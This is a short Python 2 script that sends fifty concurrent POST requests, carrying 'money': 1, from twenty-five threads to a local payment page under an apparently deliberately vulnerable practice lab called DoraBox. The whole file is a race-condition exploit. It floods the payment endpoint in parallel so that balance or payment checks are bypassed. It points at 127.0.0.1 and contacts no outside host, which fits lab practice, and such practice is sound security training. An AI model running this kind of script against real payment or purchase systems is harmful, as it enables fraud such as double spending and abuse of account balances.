import requests
import threading
import Queue

url = "http://127.0.0.1/DoraBox/race_condition/pay.php"
threads = 25
q = Queue.Queue()

for i in range(50):
    q.put(i)

def post():
    while not q.empty():
        q.get()
        r = requests.post(url, data={'money': 1})
        print(r.text)

if __name__ == '__main__':
    for i in range(threads):
        t = threading.Thread(target=post)
        t.start()

    for i in range(threads):
        t.join() 
